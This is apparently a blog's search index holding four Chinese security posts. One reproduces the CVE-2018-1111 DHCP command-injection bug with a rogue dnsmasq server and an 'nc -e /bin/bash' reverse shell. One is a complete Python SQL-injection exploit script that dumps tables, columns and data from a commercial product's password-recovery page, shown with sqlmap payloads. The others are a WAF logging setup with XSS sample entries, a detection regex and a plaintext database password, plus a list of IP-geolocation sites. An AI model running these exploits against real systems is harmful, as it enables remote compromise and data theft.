<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[CVE-2018-1111复现]]></title>
    <url>%2F2018%2F05%2F20%2FCVE-2018-1111%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[漏洞原理DynoRoot：Red Hat DHCP客户端命令执行漏洞(CVE-2018-1111)预警 复现环境 Parallels Desktop kali（攻击机） centos 7（目标主机） 注意： 关闭Parallels Desktoppd host-only模式下的dhcp 开启两台虚拟机，网络模式选择host-only 攻击机配置kali上配置ip信息：12ifconfig eth0 192.168.2.222 netmask 255.255.255.0route add default gw 192.168.2.222 kali上使用nc监听520端口（今天520^^） 1nc -l -p 520 -v 创建一个dnsmasq.conf文件123456789101112131415bind-interfacesinterface=eth0except-interface=lodhcp-range=192.168.2.10,192.168.2.30,22hdhcp-option=3,192.168.2.222dhcp-option=6,192.168.2.222log-querieslog-facility=/var/log/dnsmasq.log 攻击kali机器上运行dnsmasq来伪造dhcp服务器，发起攻击包，这里用nc反弹shell 1dnsmasq -dC dnsmasq.conf --dhcp-option=&quot;252,&apos;&amp;nc -e /bin/bash 192.168.2.222 520 #&quot; dnsmasq运行效果: 此时centos机器获取到了kali机器分配的ip地址： kali端收到了反弹的shell，root权限： 修复方式idc机器一般都是固定ip，不会使用dhcp，但有些云主机会使用到dhclient，需要升级处理。1yum update dhclient]]></content>
      <tags>
        <tag>Testing</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[几个高精度IP定位网站]]></title>
    <url>%2F2017%2F09%2F30%2F%E5%87%A0%E4%B8%AA%E9%AB%98%E7%B2%BE%E5%BA%A6IP%E5%AE%9A%E4%BD%8D%E7%BD%91%E7%AB%99%2F</url>
    <content type="text"><![CDATA[几个高精度IP定位网站：https://ip.rtbasia.com/https://www.opengps.cn/Data/IP/LocHighAcc.aspxhttp://www.ipplus360.com/]]></content>
  </entry>
  <entry>
    <title><![CDATA[结合Fluentd实现ngx_lua_waf页面展示]]></title>
    <url>%2F2016%2F10%2F20%2F%E7%BB%93%E5%90%88Fluentd%E5%AE%9E%E7%8E%B0ngx_lua_waf%E9%A1%B5%E9%9D%A2%E5%B1%95%E7%A4%BA%2F</url>
    <content type="text"><![CDATA[0x00 概述最近在看lua_waf,看看怎么搞个web界面出来，于是有了这篇笔记。 上图是大佬分享的waf日志处理流程，不过我这篇文章讲的就简单多了，如下, 纯属搞着玩儿： ngx_lua_waf简介 ngx_lua_waf，是一个轻量级、高性能的WAF模块。 防止sql注入，本地包含，部分溢出，fuzzing测试，XSS, SSRF等web攻击 防止svn/备份之类文件泄漏 防止ApacheBench之类压力测试工具的攻击 屏蔽常见的扫描黑客工具，扫描器 屏蔽异常的网络请求 屏蔽图片附件类目录php执行权限 防止webshell上传 详情（安装方法）见：https://github.com/loveshell/ngx_lua_waf Fluentd简介 Fluentd，是一个开源收集事件和日志系统，它目前提供150+扩展插件让你存储大数据用于日志搜索，数据分析和存储。这里我们用fluentd搜集lua_waf日志。 官网：http://www.fluentd.org/ 文档中心：http://docs.fluentd.org/v0.12/articles/quickstart 0x01 Fluentd安装lua_waf安装略，网上有很多教程，直接开始fluentd部署。 1.通过rpm安装，执行如下命令（如果有报错，按实际报错提示处理即可）：1$ curl -L https://toolbelt.treasuredata.com/sh/install-redhat-td-agent2.sh | sh 2.安装好之后便可以启动： 1234$ /etc/init.d/td-agent start Starting td-agent: [ OK ]$ /etc/init.d/td-agent statustd-agent (pid 21678) is running... 3.配置，如何取日志，如何进行处理分析都在这里进行配置（td-agent.conf）： 1$ sudo vi /etc/td-agent/td-agent.conf 4.必要的插件，我们这里是要将取得的日志送到mysql做分析以及页面展示，所以需要下载fluent-plugin-mysql（fluentd默认没有mysql插件）。 1gem地址：https://rubygems.org/gems/fluent-plugin-mysql/versions/0.1.5 安装命令： 1234yum install mysql-devel（依赖包）/usr/sbin/td-agent-gem install jsonpath/usr/sbin/td-agent-gem install mysql2-cs-bind/usr/sbin/td-agent-gem install fluent-plugin-mysql -v 0.1.5 ngx_lua_waf日志格式 init.lua代码片段: 1234567891011121314151617#ngx_lua_waf拦截日志格式，能够与fluentd正则匹配。function log(method,url,data,ruletag) if attacklog then local realIp = getClientIp() local ua = ngx.var.http_user_agent local servername=ngx.var.server_name local time=ngx.localtime() if ua then line = realIp..&quot; &quot;..servername..&quot; \&quot;&quot;..time..&quot;\&quot; \&quot;&quot;..method..&quot; &quot;..servername..url..&quot;\&quot; \&quot;&quot;..data..&quot;\&quot; \&quot;&quot;..ua..&quot;\&quot; \&quot;&quot;..ruletag..&quot;\&quot;\n&quot; else line = realIp..&quot; &quot;..servername..&quot; \&quot;&quot;..time..&quot;\&quot; \&quot;&quot;..method..&quot; &quot;..servername..url..&quot;\&quot; \&quot;&quot;..data..&quot;\&quot; - \&quot;&quot;..ruletag..&quot;\&quot;\n&quot; end local filename = logpath..&apos;/&apos;..servername..&quot;_sec.log&quot; write(filename,line) endend fluentd配置 td-agent.conf片段： 12345678910111213141516171819202122#将/usr/local/nginx/logs/hack/ngx_lua_waf_sec.log日志实时同步到mysql&lt;source&gt; @type tail path /usr/local/nginx/logs/hack/ngx_lua_waf_sec.log pos_file /var/log/td-agent/httpd-access.log.pos format /^(?&lt;ip&gt;[^ ]*) (?&lt;website&gt;[^ ]*) &quot;(?&lt;time&gt;[^\&quot;]*)&quot; &quot;(?&lt;method&gt;\S+)(?: +(?&lt;path&gt;[^\&quot;]*))?&quot; &quot;(?&lt;demo&gt;[^\&quot;]*)&quot; &quot;(?&lt;agent&gt;[^\&quot;]*)&quot; &quot;(?&lt;rule&gt;[^\&quot;]*)&quot;$/ time_format %Y-%m-%d %H:%M:%S tag test.http&lt;/source&gt;&lt;match test.**&gt; @type mysql_bulk host 172.20.3.64 database waf username root password qwe@123456 column_names id,ip,website,time,method,path,demo,agent,rule table waflog time_format %Y-%m-%d %H:%M:%S flush_interval 3s&lt;/match&gt; 0x02 mysql接收waf日志下面这张表存放waf的拦截日志，比较简单。接收上面td-agent传过来的数据。 123456789101112131415161718192021222324252627282930313233use pscan;SET FOREIGN_KEY_CHECKS=0;-- ------------------------------ Table structure for waflog-- ----------------------------DROP TABLE IF EXISTS `waflog`;CREATE TABLE `waflog` ( `id` int(100) NOT NULL, `ip` varchar(100) DEFAULT NULL, `website` varchar(255) DEFAULT NULL, `time` datetime DEFAULT NULL, `method` varchar(255) DEFAULT NULL, `path` varchar(255) DEFAULT NULL, `demo` varchar(255) DEFAULT NULL, `agent` varchar(255) DEFAULT NULL, `rule` varchar(255) DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=MyISAM DEFAULT CHARSET=utf8;-- ------------------------------ Records of waflog-- ----------------------------INSERT INTO `waflog` VALUES (&apos;1&apos;, &apos;172.20.3.64&apos;, &apos;www.maliciouskr.cc&apos;, &apos;2016-09-08 20:18:03&apos;, &apos;GET&apos;, &apos;/dump.php?&lt;img&lt;!--+--&gt; src=x onerror=alert(9549);//&gt;&lt;!-- --&gt;&apos;, &apos;-&apos;, &apos;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21&apos;, &apos;(?:define|eval|file_get_contents|include|require|require_once|shell_exec|phpinfo|system|passthru|preg_\\\\w+|execute|echo|print|print_r|var_dump|(fp)open|alert|showmodaldialog)\\\\(\\\&quot;&apos;);INSERT INTO `waflog` VALUES (&apos;2&apos;, &apos;172.20.3.64&apos;, &apos;www.maliciouskr.cc&apos;, &apos;2016-09-08 20:18:03&apos;, &apos;GET&apos;, &apos;/dump.php?&lt;img&lt;!--+--&gt; src=x onerror=alert(9549);//&gt;&lt;!-- --&gt;&apos;, &apos;-&apos;, &apos;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21&apos;, &apos;(?:define|eval|file_get_contents|include|require|require_once|shell_exec|phpinfo|system|passthru|preg_\\\\w+|execute|echo|print|print_r|var_dump|(fp)open|alert|showmodaldialog)\\\\(\\\&quot;&apos;);INSERT INTO `waflog` VALUES (&apos;3&apos;, &apos;172.20.3.64&apos;, &apos;www.maliciouskr.cc&apos;, &apos;2016-09-08 20:18:03&apos;, &apos;GET&apos;, &apos;/dump.php?&lt;img&lt;!--+--&gt; src=x onerror=alert(9549);//&gt;&lt;!-- --&gt;&apos;, &apos;-&apos;, &apos;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21&apos;, &apos;(?:define|eval|file_get_contents|include|require|require_once|shell_exec|phpinfo|system|passthru|preg_\\\\w+|execute|echo|print|print_r|var_dump|(fp)open|alert|showmodaldialog)\\\\(\\\&quot;&apos;);INSERT INTO `waflog` VALUES (&apos;4&apos;, &apos;172.20.3.64&apos;, &apos;www.maliciouskr.cc&apos;, &apos;2016-09-08 20:18:03&apos;, &apos;GET&apos;, &apos;/dump.php?&lt;img&lt;!--+--&gt; src=x onerror=alert(9549);//&gt;&lt;!-- --&gt;&apos;, &apos;-&apos;, &apos;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21&apos;, &apos;(?:define|eval|file_get_contents|include|require|require_once|shell_exec|phpinfo|system|passthru|preg_\\\\w+|execute|echo|print|print_r|var_dump|(fp)open|alert|showmodaldialog)\\\\(\\\&quot;&apos;);INSERT INTO `waflog` VALUES (&apos;5&apos;, &apos;172.20.3.64&apos;, &apos;www.maliciouskr.cc&apos;, &apos;2016-09-08 20:18:03&apos;, &apos;GET&apos;, &apos;/dump.php?&lt;img&lt;!--+--&gt; src=x onerror=alert(9549);//&gt;&lt;!-- --&gt;&apos;, &apos;-&apos;, &apos;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21&apos;, &apos;(?:define|eval|file_get_contents|include|require|require_once|shell_exec|phpinfo|system|passthru|preg_\\\\w+|execute|echo|print|print_r|var_dump|(fp)open|alert|showmodaldialog)\\\\(\\\&quot;&apos;);INSERT INTO `waflog` VALUES (&apos;6&apos;, &apos;172.20.3.64&apos;, &apos;www.maliciouskr.cc&apos;, &apos;2016-09-08 20:18:03&apos;, &apos;GET&apos;, &apos;/dump.php?&lt;img&lt;!--+--&gt; src=x onerror=alert(9549);//&gt;&lt;!-- --&gt;&apos;, &apos;-&apos;, &apos;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21&apos;, &apos;(?:define|eval|file_get_contents|include|require|require_once|shell_exec|phpinfo|system|passthru|preg_\\\\w+|execute|echo|print|print_r|var_dump|(fp)open|alert|showmodaldialog)\\\\(\\\&quot;&apos;);INSERT INTO `waflog` VALUES (&apos;7&apos;, &apos;172.20.3.64&apos;, &apos;www.maliciouskr.cc&apos;, &apos;2016-09-08 20:18:03&apos;, &apos;GET&apos;, &apos;/dump.php?&lt;img&lt;!--+--&gt; src=x onerror=alert(9549);//&gt;&lt;!-- --&gt;&apos;, &apos;-&apos;, &apos;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21&apos;, &apos;(?:define|eval|file_get_contents|include|require|require_once|shell_exec|phpinfo|system|passthru|preg_\\\\w+|execute|echo|print|print_r|var_dump|(fp)open|alert|showmodaldialog)\\\\(\\\&quot;&apos;);INSERT INTO `waflog` VALUES (&apos;8&apos;, &apos;172.20.3.64&apos;, &apos;www.maliciouskr.cc&apos;, &apos;2016-09-08 20:18:03&apos;, &apos;GET&apos;, &apos;/dump.php?&lt;img&lt;!--+--&gt; src=x onerror=alert(9549);//&gt;&lt;!-- --&gt;&apos;, &apos;-&apos;, &apos;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21&apos;, &apos;(?:define|eval|file_get_contents|include|require|require_once|shell_exec|phpinfo|system|passthru|preg_\\\\w+|execute|echo|print|print_r|var_dump|(fp)open|alert|showmodaldialog)\\\\(\\\&quot;&apos;);INSERT INTO `waflog` VALUES (&apos;9&apos;, &apos;172.20.3.64&apos;, &apos;www.maliciouskr.cc&apos;, &apos;2016-09-08 20:18:03&apos;, &apos;GET&apos;, &apos;/dump.php?&lt;img&lt;!--+--&gt; src=x onerror=alert(9549);//&gt;&lt;!-- --&gt;&apos;, &apos;-&apos;, &apos;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21&apos;, &apos;(?:define|eval|file_get_contents|include|require|require_once|shell_exec|phpinfo|system|passthru|preg_\\\\w+|execute|echo|print|print_r|var_dump|(fp)open|alert|showmodaldialog)\\\\(\\\&quot;&apos;); 0x03 页面展示 源码（php+mysql+Bootstrap）见github，代码质量为初学者水平，见谅。]]></content>
      <tags>
        <tag>Testing</tag>
        <tag>入侵检测</tag>
        <tag>waf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一个SQL注入利用]]></title>
    <url>%2F2016%2F05%2F08%2F%E4%B8%80%E4%B8%AASQL%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[入职你司不久，发现你司一通用产品sql注入： sqlmap无果: 123456789101112131415161718192021222324252627282930313233343536373839404142GET parameter &apos;orderNumber&apos; is vulnerable. Do you want to keep testing the others (if any)? [y/N]sqlmap identified the following injection point(s) with a total of 352 HTTP(s) requests:---Parameter: orderNumber (GET) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause Payload: orderNumber=-4408&apos; OR 9629=9629-- zPSx Type: error-based Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause Payload: orderNumber=XSDD000006&apos; AND 7053=CONVERT(INT,(SELECT CHAR(113)+CHAR(98)+CHAR(122)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7053=7053) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(107)+CHAR(118)+CHAR(113)))-- FHQv---[10:24:29] [INFO] testing Microsoft SQL Server[10:24:31] [WARNING] the back-end DBMS is not Microsoft SQL Server[10:24:31] [INFO] testing MySQL[10:24:31] [WARNING] the back-end DBMS is not MySQL[10:24:31] [INFO] testing Oracle[10:24:32] [WARNING] the back-end DBMS is not Oracle[10:24:32] [INFO] testing PostgreSQL[10:24:32] [WARNING] the back-end DBMS is not PostgreSQL[10:24:32] [INFO] testing SQLite[10:24:32] [WARNING] the back-end DBMS is not SQLite[10:24:32] [INFO] testing Microsoft Access[10:24:33] [WARNING] the back-end DBMS is not Microsoft Access[10:24:33] [INFO] testing Firebird[10:24:33] [WARNING] the back-end DBMS is not Firebird[10:24:33] [INFO] testing SAP MaxDB[10:24:33] [WARNING] the back-end DBMS is not SAP MaxDB[10:24:33] [INFO] testing Sybase[10:24:33] [WARNING] the back-end DBMS is not Sybase[10:24:33] [INFO] testing IBM DB2[10:24:34] [WARNING] the back-end DBMS is not IBM DB2[10:24:34] [INFO] testing HSQLDB[10:24:34] [WARNING] the back-end DBMS is not HSQLDB or version is &lt; 1.7.2[10:24:34] [CRITICAL] sqlmap was not able to fingerprint the back-end database management system[10:24:34] [WARNING] HTTP error codes detected during run:408 (Request Timeout) - 3 times 尝试自写了exp,跑出数据库信息： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155#coding=utf-8import urllib2import socketimport requestsfrom optparse import OptionParserimport time print &apos;&apos;&apos; _____ _____ _ _ _____ _ _ _____ _____ _____|_ _| / _ \ | | | | / ___| | | | | / ___/ | ____| / ___| | | | | | | | | | | | | | |_| | | |___ | |__ | | | | | | | | | | | | | | | _ | \___ \ | __| | | | | | |_| | | |_| | | |___ | | | | ___| | | |___ | |___ |_| \_____/ \_____/ \_____| |_| |_| /_____/ |_____| \_____|&apos;&apos;&apos;print &apos;&apos;&apos;Obtaining the database now!&apos;&apos;&apos; parser = OptionParser()parser.add_option(&quot;-u&quot;, &quot;--url&quot;, dest=&quot;targeturl&quot;, help=&quot;target url&quot;,type=&quot;string&quot;)parser.add_option(&quot;-t&quot;, &quot;--table&quot;, dest=&quot;table&quot;, help=&quot;target table&quot; )parser.add_option(&quot;-c&quot;, &quot;--column&quot;, dest=&quot;column&quot;, help=&quot;target column&quot;)parser.add_option(&quot;-q&quot;, &quot;--quiet&quot;, action=&quot;store_false&quot;, dest=&quot;verbose&quot;, default=True, help=&quot;don&apos;t print status messages to stdout&quot;) (options, args) = parser.parse_args() def main(): global targeturl targeturl = options.targeturl global targettable targettable =options.table global targetcol targetcol = options.column #if options.table != None: if options.targeturl == None : print &quot;it does not work! use -h to get on&quot; else: if targeturl != None and targettable == None and targetcol == None: gettables() if targettable != None and targetcol == None: getcolumn() if targettable != None and targetcol != None: dumpdata() else: print &quot;it does not work! use -h to get on&quot; def gettables(): id = range(1,3000) exp1 = &quot;/eassso/findPsw.jsp?dataCenter=test&amp;userNO=administrator\&apos;&quot; exp2 = urllib2.quote(&quot;) AND (select top 1 name from sysobjects where name not in (select top &quot;) exp3 = urllib2.quote(&quot; name from sysobjects))=1&quot;) now = time.strftime(&apos;%Y-%m-%d %H:%M:%S&apos;,time.localtime(time.time())) f = open(&quot;/explogs/table.log&quot;, &apos;wb&apos;) f.write(&apos;------SQL Injection Result------\n&apos;) f.write(now+&apos;\n&apos;) f.close() for i in id: timeout = 5 sleep_time = 0.05 time.sleep(sleep_time) # 这里时间自己设定 exp = urllib2.urlopen(str(targeturl)+str(exp1)+str(exp2)+str(i)+str(exp3)) info = exp.read() if &quot;type&quot; in info: print str(i)+&quot;:&quot;, tag1 = info.find(&apos;\&apos;&apos;) tag1 = tag1 + 1 tag2 = info.find(&apos;\&apos;&apos;, tag1) result = info[tag1:tag2] print result d = open(&quot;/explogs/table.log&quot;, &apos;a&apos;) d.write(str(i)+&apos;:&apos;+result+&apos;\n&apos;) d.close() else: print &quot;over&quot; def getcolumn(): id = range(1,3000) #targeturl = options.targeturl exp1 = &quot;/eassso/findPsw.jsp?dataCenter=test&amp;userNO=administrator\&apos;&quot; exp2 = urllib2.quote(&quot;) AND (SELECT top 1 c.name FROM syscolumns c,sysobjects s WHERE c.id=s.id AND s.name=\&apos;&quot;) exp3 = urllib2.quote(&quot;\&apos; and c.name not in (SELECT top &quot;) exp4 = urllib2.quote(&quot; c.name FROM syscolumns c,sysobjects s WHERE c.id=s.id AND s.name=\&apos;&quot;) exp5 = urllib2.quote(&quot;\&apos;) )=1&quot;) now = time.strftime(&apos;%Y-%m-%d %H:%M:%S&apos;,time.localtime(time.time())) f = open(&quot;/explogs/col.log&quot;, &apos;wb&apos;) f.write(&apos;------SQL Injection Result------\n&apos;) f.write(now+&apos;\n&apos;) f.close() for i in id: timeout = 5 sleep_time = 0.05 time.sleep(sleep_time) # 这里时间自己设定 exp = urllib2.urlopen(str(targeturl)+str(exp1)+str(exp2)+str(targettable)+str(exp3)+str(i)+str(exp4)+str(targettable)+str(exp5)) info = exp.read() if &quot;type&quot; in info: print str(i)+&quot;:&quot;, tag1 = info.find(&apos;\&apos;&apos;) tag1 = tag1 + 1 tag2 = info.find(&apos;\&apos;&apos;, tag1) result = info[tag1:tag2] print result d = open(&quot;/explogs/col.log&quot;, &apos;a&apos;) d.write(str(i)+&apos;:&apos;+result+&apos;\n&apos;) d.close() else: print &quot;over&quot; def dumpdata(): id = range(1,3000) exp1 = &quot;/eassso/findPsw.jsp?dataCenter=test&amp;userNO=administrator\&apos;&quot; exp2 = urllib2.quote(&quot;) AND (select top 1 &quot;) #targetcol exp3 = urllib2.quote(&quot; from &quot;) #targettable exp4 = urllib2.quote(&quot; where &quot;) #targetcol exp5 = urllib2.quote(&quot; not in (SELECT TOP &quot;) #i #targetcol exp6 = urllib2.quote(&quot; FROM &quot;) #targettable exp7 = urllib2.quote(&quot; ) )=1&quot;) now = time.strftime(&apos;%Y-%m-%d %H:%M:%S&apos;,time.localtime(time.time())) f = open(&quot;/explogs/data.log&quot;, &apos;wb&apos;) f.write(&apos;------SQL Injection Result------\n&apos;) f.write(now+&apos;\n&apos;) f.close() for i in id: timeout = 5 sleep_time = 0.05 time.sleep(sleep_time) # 这里时间自己设定 exp = urllib2.urlopen(str(targeturl)+str(exp1)+str(exp2)+str(targetcol)+str(exp3)+str(targettable)+str(exp4)+str(targetcol)+str(exp5)+str(i)+str(targetcol)+str(exp6)+str(targettable)+str(exp7)) info = exp.read() if &quot;type&quot; in info: print str(i)+&quot;:&quot;, tag1 = info.find(&apos;\&apos;&apos;) tag1 = tag1 + 1 tag2 = info.find(&apos;\&apos;&apos;, tag1) result = info[tag1:tag2] print result d = open(&quot;/explogs/data.log&quot;, &apos;a&apos;) d.write(str(i)+&apos;:&apos;+result+&apos;\n&apos;) d.close() else: print &quot;over&quot;if __name__ == &apos;__main__&apos;: main() 效果：]]></content>
      <tags>
        <tag>PenTesting</tag>
      </tags>
  </entry>
</search>
